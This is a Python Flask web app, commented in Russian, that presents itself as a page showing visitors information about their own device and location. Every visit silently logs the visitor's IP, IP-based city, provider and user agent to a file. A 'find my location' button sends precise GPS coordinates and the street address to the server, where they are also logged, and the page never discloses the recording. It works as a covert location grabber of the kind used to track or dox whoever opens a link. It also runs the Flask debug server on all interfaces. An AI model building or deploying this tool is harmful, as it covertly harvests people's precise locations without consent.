from flask import Flask, request, render_template_string
import requests
from datetime import datetime
import re
import json

app = Flask(__name__)

def get_ip_data(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        return response.json()
    except:
        return {"error": "Не удалось получить данные"}

def parse_user_agent(user_agent):
    os = browser = device = "Неизвестно"
    
    # Определение ОС
    os_patterns = {
        'Windows 11': r'Windows NT 10.0; Win64; x64',
        'Windows 10': r'Windows NT 10.0',
        'Linux': r'Linux',
        'Android': r'Android',
        'iOS': r'iPhone|iPad|iPod',
        'Mac OS X': r'Macintosh'
    }
    
    for name, pattern in os_patterns.items():
        if re.search(pattern, user_agent):
            os = name
            break

    # Определение браузера
    browser_patterns = {
        'Chrome': r'Chrome',
        'Firefox': r'Firefox',
        'Safari': r'Safari',
        'Edge': r'Edg'
    }
    
    for name, pattern in browser_patterns.items():
        if re.search(pattern, user_agent):
            browser = name
            break

    # Тип устройства
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent:
        device = "Смартфон/Планшет"
    else:
        device = "Компьютер"

    return os, browser, device

def log_data(ip, user_agent, geo, os, browser, device, gps_data=None):
    log_entry = f"""
=== Новый вход ===
Время: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
IP: {ip}
Страна: {geo.get('country', 'Неизвестно')}
Город: {geo.get('city', 'Неизвестно')}
Провайдер: {geo.get('org', 'Неизвестно')}
ОС: {os}
Браузер: {browser}
Устройство: {device}
User-Agent: {user_agent}
"""
    if gps_data:
        log_entry += f"""GPS данные:
Широта: {gps_data.get('lat', '')}
Долгота: {gps_data.get('lon', '')}
Точность: {gps_data.get('acc', '')} м
Адрес: {gps_data.get('address', '')}
"""
    log_entry += "------------------------------------\n"
    
    with open("ips.log", "a", encoding="utf-8") as f:
        f.write(log_entry)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Полная информация об устройстве</title>
    <style>
        :root {
            --primary: #4285f4;
            --secondary: #34a853;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            padding: 15px;
            line-height: 1.6;
            color: #333;
        }
        .info-block {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
        }
        h2 {
            color: var(--primary);
            margin-top: 0;
        }
        button {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 16px;
            width: 100%;
            cursor: pointer;
            margin: 10px 0;
            transition: background 0.3s;
        }
        button:hover {
            background: #3367d6;
        }
        #map {
            height: 250px;
            width: 100%;
            border-radius: 12px;
            margin-top: 15px;
            border: 1px solid #ddd;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            background: var(--secondary);
            color: white;
            border-radius: 10px;
            font-size: 12px;
        }
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
            color: #666;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
        }
        @media (max-width: 600px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="info-block">
        <h2>🌐 Сетевая информация</h2>
        <div class="grid">
            <div>
                <p><strong>IP адрес:</strong><br>{{ ip }}</p>
                <p><strong>Провайдер:</strong><br>{{ isp }}</p>
            </div>
            <div>
                <p><strong>Страна:</strong><br>{{ country }}</p>
                <p><strong>Город:</strong><br>{{ city }}</p>
            </div>
        </div>
    </div>

    <div class="info-block">
        <h2>💻 Системная информация</h2>
        <div class="grid">
            <div>
                <p><strong>ОС:</strong><br>{{ os }}</p>
                <p><strong>Устройство:</strong><br>{{ device }}</p>
            </div>
            <div>
                <p><strong>Браузер:</strong><br>{{ browser }}</p>
                <p><strong>Ядра CPU:</strong><br><span id="cpuCores">Определение...</span></p>
            </div>
        </div>
    </div>

    <div class="info-block">
        <h2>📍 Точная геолокация</h2>
        <button onclick="getPreciseLocation()">Определить моё местоположение</button>
        <div id="loading" class="loading">
            <p>Определение местоположения...</p>
        </div>
        <div id="geoResult" style="display:none;">
            <p><strong>Координаты:</strong><br>
            Широта: <span id="latitude"></span><br>
            Долгота: <span id="longitude"></span><br>
            Точность: <span id="accuracy" class="badge"></span></p>
            <p><strong>Адрес:</strong><br><span id="address"></span></p>
            <div id="map"></div>
        </div>
    </div>

    <script>
        // Определение ядер процессора
        document.getElementById('cpuCores').textContent = 
            navigator.hardwareConcurrency || "Неизвестно";

        // Улучшенная геолокация
        function getPreciseLocation() {
            const loading = document.getElementById('loading');
            const geoResult = document.getElementById('geoResult');
            
            loading.style.display = 'block';
            geoResult.style.display = 'none';
            
            if (!navigator.geolocation) {
                alert("Ваш браузер не поддерживает геолокацию");
                loading.style.display = 'none';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = Math.round(position.coords.accuracy);
                    
                    // Отображение координат
                    document.getElementById('latitude').textContent = lat.toFixed(6);
                    document.getElementById('longitude').textContent = lon.toFixed(6);
                    document.getElementById('accuracy').textContent = `±${acc} м`;
                    
                    // Получение адреса
                    const address = await getAddress(lat, lon);
                    document.getElementById('address').textContent = address || "Не удалось определить";
                    
                    // Показать карту
                    showMap(lat, lon);
                    
                    // Отправить данные на сервер для логирования
                    sendToServer(lat, lon, acc, address);
                    
                    loading.style.display = 'none';
                    geoResult.style.display = 'block';
                },
                (error) => {
                    loading.style.display = 'none';
                    handleGeolocationError(error);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        async function getAddress(lat, lon) {
            try {
                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                const data = await response.json();
                const addr = data.address || {};
                return [
                    addr.road, 
                    addr.house_number, 
                    addr.city || addr.town || addr.village
                ].filter(Boolean).join(', ');
            } catch {
                return null;
            }
        }

        function showMap(lat, lon) {
            // Используем OpenStreetMap для отображения
            document.getElementById('map').innerHTML = `
                <iframe
                    width="100%"
                    height="100%"
                    frameborder="0"
                    scrolling="no"
                    marginheight="0"
                    marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&amp;layer=mapnik&amp;marker=${lat}%2C${lon}"
                ></iframe>`;
        }

        function sendToServer(lat, lon, acc, address) {
            // Отправка данных GPS на сервер для логирования
            fetch('/log_gps', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    lat: lat,
                    lon: lon,
                    acc: acc,
                    address: address
                })
            });
        }

        function handleGeolocationError(error) {
            const messages = {
                1: "Доступ к геолокации запрещён. Разрешите доступ в настройках браузера.",
                2: "Не удалось определить местоположение. Проверьте подключение к интернету и GPS.",
                3: "Время ожидания истекло. Убедитесь, что GPS включён."
            };
            alert(messages[error.code] || "Произошла неизвестная ошибка");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Неизвестно')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    # Логируем базовую информацию
    log_data(ip, user_agent, geo, os, browser, device)
    
    return render_template_string(HTML_TEMPLATE,
        ip=ip,
        country=geo.get('country', 'Неизвестно'),
        city=geo.get('city', 'Неизвестно'),
        isp=geo.get('org', 'Неизвестно'),
        os=os,
        browser=browser,
        device=device
    )

@app.route('/log_gps', methods=['POST'])
def log_gps():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Неизвестно')
    geo = get_ip_data(ip)
    os, browser, device = parse_user_agent(user_agent)
    
    log_data(ip, user_agent, geo, os, browser, device, {
        'lat': data.get('lat'),
        'lon': data.get('lon'),
        'acc': data.get('acc'),
        'address': data.get('address')
    })
    
    return {'status': 'success'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
